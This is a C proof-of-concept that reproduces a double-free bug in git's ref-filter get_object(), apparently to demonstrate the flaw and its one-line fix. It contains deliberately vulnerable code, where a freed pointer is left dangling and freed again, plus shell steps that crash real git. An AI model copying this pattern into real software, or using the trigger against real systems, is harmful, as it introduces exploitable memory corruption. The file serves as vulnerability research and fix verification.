/*
 * GitDup — Git ref-filter double free when an object is missing (CWE-415)
 *
 * Faithful port of git v2.56.1 `ref-filter.c get_object()` (the latest release, still
 * vulnerable; fix b20f82b0 is unreleased). The only abstraction is a stub object store so
 * the PoC is self-contained — the control flow, the reused `expand_data`, the `goto out`
 * cleanup and the `if (!eaten) free(oi->content)` are transcribed from the real function.
 *
 * Root cause (from the fix commit message):
 *   "get_object() frees oi->content but leaves the pointer unchanged. Since the expand_data
 *    structures are reused across refs, a later call can start with content pointing to a
 *    freed buffer. Then, if the object lookup in that call fails before it overwrites the
 *    pointer, the cleanup path frees the buffer a second time."
 *
 * Trigger in real git:
 *   git init repo && cd repo && test_commit initial && git tag -a -m x annotated &&
 *   <make refs/tags/missing point at a missing object> &&
 *   git for-each-ref --format='%(*objectname)' refs/tags/
 *   => "free(): double free detected in tcache 2", git aborts.
 *
 * Build:  bash build.sh      Run: ./poc        (or: ./poc fixed)
 */
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

/* ---- transcribed shapes from ref-filter.c / object.h (trimmed to what the bug needs) ---- */
struct object_info {
	int   *contentp;     /* non-NULL for %(*objectname) etc. => git reads object content */
	unsigned long size;
};
struct expand_data {           /* one of these (oi / oi_deref) is REUSED across every ref */
	char               *content;       /* <-- freed but never reset: the dangling pointer */
	void               *maybe_object;
	struct object_info  info;
};
struct ref_array_item { const char *refname; };

/* Whether get_object() applies the one-line fix (commit b20f82b0: oi->content = NULL). */
static int APPLY_FIX = 0;

/*
 * Stub for odb_read_object_info_extended(): returns non-zero when the object is missing.
 * On success it allocates oi->content for the object payload, exactly like git reading an
 * object's bytes into the reused expand_data.
 */
static int odb_read_object_info_extended(struct expand_data *oi, int missing)
{
	if (missing)
		return 1;                         /* lookup fails; oi->content is NOT touched */
	oi->content = malloc(64);             /* object payload buffer */
	strcpy(oi->content, "annotated-tag-target-object-bytes");
	return 0;
}

/* Faithful port of git v2.56.1 ref-filter.c:2344 get_object(). */
static int get_object(struct ref_array_item *ref, struct expand_data *oi, int missing)
{
	int eaten = 0;                        /* parse_object_buffer sets 1 if it took the buffer */
	int ret;

	oi->maybe_object = NULL;
	if (APPLY_FIX)
		oi->content = NULL;               /* <-- THE FIX (b20f82b0), absent in v2.56.1 */

	if (oi->info.contentp) {
		/* size/type pointers would be set here */
	}

	if (odb_read_object_info_extended(oi, missing)) {
		ret = -1;                         /* "missing object %s for %s" */
		fprintf(stderr, "    error: missing object for %s\n", ref->refname);
		goto out;                         /* content still points at the PREVIOUS ref's freed buffer */
	}

	if (oi->info.contentp) {
		/* grab_values() consumes oi->content; eaten stays 0 => freed below */
		printf("    %s -> read object content @%p\n", ref->refname, (void *)oi->content);
	}

	ret = 0;
out:
	if (!eaten)
		free(oi->content);                /* double free on the missing-object call */
	return ret;
}

int main(int argc, char **argv)
{
	setvbuf(stdout, NULL, _IONBF, 0);     /* so the narrative prints before the abort */
	if (argc > 1 && !strcmp(argv[1], "fixed"))
		APPLY_FIX = 1;

	/* expand_data reused across refs, as in populate_value()'s loop. contentp set by %(*objectname). */
	int content_sentinel = 1;
	struct expand_data oi = { .content = NULL, .info = { .contentp = &content_sentinel } };

	/* Refs are visited in sorted order: "annotated" before "missing" (matches the regression test). */
	struct ref_array_item annotated = { .refname = "refs/tags/annotated" };
	struct ref_array_item missing   = { .refname = "refs/tags/missing" };

	printf("[*] get_object(%s)  for the annotated tag (valid object)\n",
	       APPLY_FIX ? "fixed" : "vulnerable");
	get_object(&annotated, &oi, /*missing=*/0);
	printf("    (oi.content freed at 'out'; pointer left = %p %s)\n\n",
	       (void *)oi.content, APPLY_FIX ? "" : "<-- DANGLING, not reset");

	printf("[*] get_object(%s)  for a ref whose object is MISSING\n",
	       APPLY_FIX ? "fixed" : "vulnerable");
	get_object(&missing, &oi, /*missing=*/1);

	printf("\n[+] survived — no double free (this is the FIXED behaviour)\n");
	return 0;
}
